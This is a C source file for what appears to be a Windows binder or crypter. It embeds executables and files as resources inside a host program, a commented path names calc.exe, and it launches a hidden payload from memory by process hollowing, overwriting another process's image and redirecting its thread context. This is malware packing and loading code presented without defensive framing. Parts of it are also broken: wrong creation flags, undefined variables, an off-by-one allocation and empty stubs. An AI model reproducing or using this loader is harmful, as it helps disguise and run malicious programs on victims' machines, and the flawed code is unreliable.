#include "run.h"



void Extract_and_Run()
{

}





void Run(int id, char *path)
{
    HGLOBAL hResData;
    HRSRC   hResInfo;
    void    *pvRes;
    DWORD dwSize;
    char* lpMemory;
    HMODULE hModule = GetModuleHandle(NULL);
    if ((hResInfo = FindResource(hModule, MAKEINTRESOURCE(id), RT_RCDATA)) != NULL)
    {
        if ((hResData = LoadResource(hModule, hResInfo)) != NULL)
        {
            if ((pvRes = LockResource(hResData)) != NULL)
            {
                dwSize = SizeofResource(hModule, hResInfo);
                if(dwSize == 0)
                {
                    puts("no data");
                    return;
                }
                else
                {
                    //printf("%d", dwSize);
                }
                lpMemory = (char*)malloc (dwSize);
                memset(lpMemory,0,dwSize);
                memcpy (lpMemory, pvRes, dwSize);
                RunFromMemory(lpMemory,path);
            }
        }
    }
}

void RunFromMemory(char* pImage,char* pPath)
{
    DWORD dwWritten = 0;
    DWORD dwHeader = 0;
    DWORD dwImageSize = 0;
    DWORD dwSectionCount = 0;
    DWORD dwSectionSize = 0;
    DWORD firstSection = 0;
    DWORD previousProtection = 0;
    DWORD jmpSize = 0;

    IMAGE_NT_HEADERS INH;
    IMAGE_DOS_HEADER IDH;
    IMAGE_SECTION_HEADER Sections[1000];

    PROCESS_INFORMATION peProcessInformation;
    STARTUPINFO peStartUpInformation;
    CONTEXT pContext;

    char* pMemory;
    char* pFile;
    memcpy(&IDH,pImage,sizeof(IDH));
    memcpy(&INH,(void*)((DWORD)pImage+IDH.e_lfanew),sizeof(INH));

    dwImageSize = INH.OptionalHeader.SizeOfImage;
    pMemory = (char*)malloc(dwImageSize);
    memset(pMemory,0,dwImageSize);
    pFile = pMemory;

    dwHeader = INH.OptionalHeader.SizeOfHeaders;
    firstSection = (DWORD)(((DWORD)pImage+IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
    memcpy(Sections,(char*)(firstSection),sizeof(IMAGE_SECTION_HEADER)*INH.FileHeader.NumberOfSections);

    memcpy(pFile,pImage,dwHeader);

    if((INH.OptionalHeader.SizeOfHeaders % INH.OptionalHeader.SectionAlignment)==0)
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders;
    }
    else
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders / INH.OptionalHeader.SectionAlignment;
        jmpSize += 1;
        jmpSize *= INH.OptionalHeader.SectionAlignment;
    }

    pFile = (char*)((DWORD)pFile + jmpSize);

    for(dwSectionCount = 0; dwSectionCount < INH.FileHeader.NumberOfSections; dwSectionCount++)
    {
        jmpSize = 0;
        dwSectionSize = Sections[dwSectionCount].SizeOfRawData;
        memcpy(pFile,(char*)(pImage + Sections[dwSectionCount].PointerToRawData),dwSectionSize);

        if((Sections[dwSectionCount].Misc.VirtualSize % INH.OptionalHeader.SectionAlignment)==0)
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize;
        }
        else
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize / INH.OptionalHeader.SectionAlignment;
            jmpSize += 1;
            jmpSize *= INH.OptionalHeader.SectionAlignment;
        }
        pFile = (char*)((DWORD)pFile + jmpSize);
    }


    memset(&peStartUpInformation,0,sizeof(STARTUPINFO));
    memset(&peProcessInformation,0,sizeof(PROCESS_INFORMATION));
    memset(&pContext,0,sizeof(CONTEXT));

    peStartUpInformation.cb = sizeof(peStartUpInformation);
    if(CreateProcess(NULL,pPath,&secAttrib,NULL,FALSE,CREATE_NEW_CONSOLE&CREATE_SUSPENDED,NULL,NULL,&peStartUpInformation,&peProcessInformation))
    {
        pContext.ContextFlags = CONTEXT_FULL;
        GetThreadContext(peProcessInformation.hThread,&pContext);
        VirtualProtectEx(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),dwImageSize,PAGE_EXECUTE_READWRITE,&previousProtection);
        WriteProcessMemory(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),pMemory,dwImageSize,&dwWritten);
        WriteProcessMemory(peProcessInformation.hProcess,(void*)((DWORD)pContext.Ebx + 8),&INH.OptionalHeader.ImageBase,4,&dwWritten);
        pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(peProcessInformation.hThread,&pContext);
        VirtualProtectEx(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),dwImageSize,previousProtection,0);
        ResumeThread(peProcessInformation.hThread);
    }
    free(pMemory);
}


/* change icon */
void change_icon (){}



/******************** done below *********************/

void Extract(const char *prog, int id, const char *filename)
{
    HRSRC res;              // handle/ptr. to res. info.
    HGLOBAL res_loaded;     // handle to loaded resource
    char *res_lock;	        // pointer to resource data
    DWORD res_size;
    FILE *output = fopen(filename, "wb+");
    HMODULE exe = LoadLibrary(prog);

    // find location of the resource and get handle to it
    res = FindResource(exe, MAKEINTRESOURCE(id), RT_RCDATA);

    // loads the specified resource into global memory.
    res_loaded = LoadResource(exe, res);

    // get a pointer to the loaded resource!
    res_lock = (char*)LockResource(res_loaded);

    // determine the size of the resource, so we know how much to write out to file!
    res_size = SizeofResource(exe, res);
    //printf("%d\n", (int)res_size);

    fwrite(res_lock, 1, res_size, output);

    fclose(output);
    FreeLibrary(exe);
}

char* Load_file(const char *path, int size)
{
    FILE *file = fopen(path, "rb");
    char *buf = malloc(size);

    fread(buf, sizeof(char), size, file);

    fclose(file);

    return buf;
};

void Update(int id, const char *data, int size)
{
    if(size == 0) {
        return;
    }

    //extern const char *final_prog;
    char *buf = malloc(size);
    memcpy(buf, data, size);
    BOOL result;

// Open the file to which you want to add the dialog box resource.
    /*update = BeginUpdateResource("../dst/calc.exe", TRUE);
    if (update == NULL)
    {
        puts("Could not open file for writing.");
        return;
    }*/

// Add the dialog box resource to the update list.
    result = UpdateResource(update,    // update resource handle
                            RT_RCDATA,                         // change dialog box resource
                            MAKEINTRESOURCE(id),         // dialog box id
                            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),  // neutral language
                            buf,                         // ptr to resource info
                            size);       // size of resource info

    if (result == FALSE)
    {
        puts("Could not add resource.");
        return;
    }

// Write changes to FOOT.EXE and then close it.
    /*if (!EndUpdateResource(update, FALSE))
    {
        puts("Could not write changes to file.");
        return;
    }*/
}

DWORD res_size(const char *prog, int id)
{
    HMODULE exe = LoadLibrary(prog);
    HRSRC res;
    DWORD size;

    res = FindResource(exe, MAKEINTRESOURCE(id), RT_RCDATA);
    size = SizeofResource(exe, res);
    printf("%d\n", size);

    return size;
}

const char* make_config (int dir, int exe, int file)
{
    const char *config;

    config = make_string(dir);
    config = cat_string(config, " ");

    config = cat_string(config, make_string(exe));
    config = cat_string(config, " ");

    config = cat_string(config, make_string(file));
    config = cat_string(config, " ");

    return config;
}

const char* make_string (int num)
{
    char *str;
    int len = 0;
    int tmp = num;

    if(tmp == 0) {
        str = malloc(2);
        str[0] = '0';
        str[1] = '\0';
        return str;
    }

    while (tmp) {
        tmp /= 10;
        len++;
    }

    str = malloc(len+1);
    sprintf(str, "%d", num);

    return str;
};

void update_config (const char *config)
{
    Update(ID_CONFIG, config, strlen(config));
}

void update_dir (Dir_file *dirs)
{
    int i = 0;
    for (i = 0; dirs != NULL; i++, dirs = dirs->next_dir) {
        Update(ID_DIR+i, dirs->path, strlen(dirs->path));
    }
    puts("dir done.");
}

void update_exe (Exe_file *exes)
{
    int i = 0;
    for (i = 0; exes != NULL; i++, exes = exes->next_exe) {
        char *data = Load_file(exes->path, exes->size);
        Update(ID_EXE_DATA+i, data, exes->size);
        free(data);

        Update(ID_EXE_PATH+i, exes->path, strlen(exes->path));
    }
    puts("exe done.");
}

void update_file (Data_file *files)
{
    int i = 0;
    for (i = 0; files != NULL; i++, files = files->next_file) {
        printf("%d %s\n", i, files->path);
        char *data = Load_file(files->path, files->size);
        Update(ID_FILE_DATA+i, data, files->size);
        free(data);

        Update(ID_FILE_PATH+i, files->path, strlen(files->path));
    }
}

const char* cat_string(const char* first, const char* second)
{
    char *str;
    int len;

    len = strlen(first) + strlen(second);
    str = malloc(len);

    strcpy(str, first);
    strcat(str, second);

    return str;
}
